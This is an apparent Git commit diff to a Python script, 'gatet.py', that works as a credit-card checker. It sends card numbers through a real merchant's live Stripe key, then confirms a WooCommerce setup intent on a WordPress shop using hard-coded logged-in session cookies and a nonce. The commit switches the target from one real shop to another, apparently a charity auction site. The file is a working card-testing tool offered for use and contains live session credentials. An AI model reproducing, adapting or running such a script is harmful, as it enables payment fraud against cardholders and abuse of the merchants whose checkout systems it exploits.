9808aa73137ae8d5dba33ccccfb3462cd6df1f8c
nomi924500-sudo <nomi924500@gmail.com>
2026-03-01 00:16:07 +0630

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -26,37 +26,31 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F157d4ab676%3B+stripe-js-v3%2F157d4ab676%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbespokeutilitydesign.uk&time_on_page=73298&client_attribution_metadata[client_session_id]=0b4986e2-6db6-4b42-beb9-11fda47cba7c&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=adc36ad6-27ac-453f-a003-3895234655d3&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=NA&muid=NA&sid=NA&key=pk_live_51QjnPV2MjoKV3YuRePNjSPTGO3FHCRCYwZLtGRtRvQRuKVINj96iZlxGdx6jukb5uYQQGWPq04ClZYwIIChOQis9007yEEZqcf&_stripe_version=2024-06-20'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2Fe4b3a3b372%3B+stripe-js-v3%2Fe4b3a3b372%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fauctions.villagemissions.ca&time_on_page=65581&client_attribution_metadata[client_session_id]=bd89ee1c-9ed4-4319-b22d-e32b53ce46e8&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=f9693e72-dc19-4b43-a72f-1313f78e89aa&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=NA&muid=NA&sid=NA&key=pk_live_51GE2waGPXGoRNMCoydfJx1tgP9sZTkvtzAs3Nbt3ZNoEIqLGXmaBduQy8kAn3MbiM7Ydavn2GccXMoltiU1s4QkI002CiXYXxh&_stripe_version=2024-06-20'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    'wordpress_sec_d54127facf26163901c7742e75741c76': 'waow%7C1773322578%7C1jpTtqsvjdAGL7kfPjeHbeoa0QE2lj8lrbt4Ti8IZYc%7C990e8a037d226e8cab36d5478229e72836b0857126aba1d94019cddebb3d335c',
-	    '_ga': 'GA1.1.1575939560.1770368766',
-	    '_gcl_au': '1.1.262757717.1770368766',
-	    '__stripe_mid': '549544fc-8682-4fe4-8bdd-a1433c1eb02124a8a6',
-	    'wordpress_logged_in_d54127facf26163901c7742e75741c76': 'waow%7C1773322578%7C1jpTtqsvjdAGL7kfPjeHbeoa0QE2lj8lrbt4Ti8IZYc%7Cba42dfdbfe1f6c55c222de3010d1429501461264457237374ab1424d3040929a',
-	    'sbjs_migrations': '1418474375998%3D1',
-	    'sbjs_current_add': 'fd%3D2026-02-27%2013%3A01%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F',
-	    'sbjs_first_add': 'fd%3D2026-02-27%2013%3A01%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F',
-	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
-	    '__stripe_sid': 'df518d74-6648-4a97-85dd-f28f6d2fd813a214a8',
-	    '_ga_WVQWTK679F': 'GS2.1.s1772199099$o17$g1$t1772199116$j43$l0$h0',
-	    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F',
+	    'wordpress_sec_073d82570be277467757b0badec83214': 'sonp71043%7C1773509772%7C9GssjaGF61NZgih15ZAFIluJAH5sT1g1a932DSFFIRH%7C6423a2f675294d77b0e767cf4bb4cd68125ba0858a746d3e1c19448fcdefa9aa',
+	    '_gid': 'GA1.2.873290409.1772300131',
+	    'wordpress_logged_in_073d82570be277467757b0badec83214': 'sonp71043%7C1773509772%7C9GssjaGF61NZgih15ZAFIluJAH5sT1g1a932DSFFIRH%7C3367604e66dd4aa30d27b87c3447ffbd38b2ac46723da1c54a812842bd8187c6',
+	    'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fauctions.villagemissions.ca%2Fshop%2Fmy-account%2Fadd-payment-method%2F',
+	    '_ga_SRB47NYP0B': 'GS2.1.s1772300129$o1$g1$t1772300181$j8$l0$h0',
+	    '_ga': 'GA1.2.592858208.1772300130',
+	    '__stripe_mid': 'e02dbbe4-9af2-40f6-b6d6-9294df166ecb01a69a',
+	    '__stripe_sid': '9cb9ad5e-7d6a-404f-bf3f-73bc307fbe612eeae0',
 	}
 	
 	headers = {
-	    'authority': 'bespokeutilitydesign.uk',
+	    'authority': 'auctions.villagemissions.ca',
 	    'accept': '*/*',
 	    'accept-language': 'en-US,en;q=0.9',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': 'wordpress_sec_d54127facf26163901c7742e75741c76=waow%7C1773322578%7C1jpTtqsvjdAGL7kfPjeHbeoa0QE2lj8lrbt4Ti8IZYc%7C990e8a037d226e8cab36d5478229e72836b0857126aba1d94019cddebb3d335c; _ga=GA1.1.1575939560.1770368766; _gcl_au=1.1.262757717.1770368766; __stripe_mid=549544fc-8682-4fe4-8bdd-a1433c1eb02124a8a6; wordpress_logged_in_d54127facf26163901c7742e75741c76=waow%7C1773322578%7C1jpTtqsvjdAGL7kfPjeHbeoa0QE2lj8lrbt4Ti8IZYc%7Cba42dfdbfe1f6c55c222de3010d1429501461264457237374ab1424d3040929a; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-02-27%2013%3A01%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2026-02-27%2013%3A01%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=df518d74-6648-4a97-85dd-f28f6d2fd813a214a8; _ga_WVQWTK679F=GS2.1.s1772199099$o17$g1$t1772199116$j43$l0$h0; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F',
-	    'origin': 'https://bespokeutilitydesign.uk',
-	    'referer': 'https://bespokeutilitydesign.uk/my-account/add-payment-method/',
+	    # 'cookie': 'wordpress_sec_073d82570be277467757b0badec83214=sonp71043%7C1773509772%7C9GssjaGF61NZgih15ZAFIluJAH5sT1g1a932DSFFIRH%7C6423a2f675294d77b0e767cf4bb4cd68125ba0858a746d3e1c19448fcdefa9aa; _gid=GA1.2.873290409.1772300131; wordpress_logged_in_073d82570be277467757b0badec83214=sonp71043%7C1773509772%7C9GssjaGF61NZgih15ZAFIluJAH5sT1g1a932DSFFIRH%7C3367604e66dd4aa30d27b87c3447ffbd38b2ac46723da1c54a812842bd8187c6; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fauctions.villagemissions.ca%2Fshop%2Fmy-account%2Fadd-payment-method%2F; _ga_SRB47NYP0B=GS2.1.s1772300129$o1$g1$t1772300181$j8$l0$h0; _ga=GA1.2.592858208.1772300130; __stripe_mid=e02dbbe4-9af2-40f6-b6d6-9294df166ecb01a69a; __stripe_sid=9cb9ad5e-7d6a-404f-bf3f-73bc307fbe612eeae0',
+	    'origin': 'https://auctions.villagemissions.ca',
+	    'referer': 'https://auctions.villagemissions.ca/shop/my-account/add-payment-method/',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -69,11 +63,16 @@ def Tele(ccx):
 	
 	data = {
 	    'action': 'wc_stripe_create_and_confirm_setup_intent',
-	    'wc-stripe-payment-method': f'{pm}',
+	    'wc-stripe-payment-method': pm,
 	    'wc-stripe-payment-type': 'card',
-	    '_ajax_nonce': 'b2a2e57117',
+	    '_ajax_nonce': 'b0409d6a5d',
 	}
 	
-	r2 = requests.post('https://bespokeutilitydesign.uk/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+	r2 = requests.post(
+	    'https://auctions.villagemissions.ca/wp-admin/admin-ajax.php',
+	    cookies=cookies,
+	    headers=headers,
+	    data=data,
+	)
 	
 	return (r2.json())
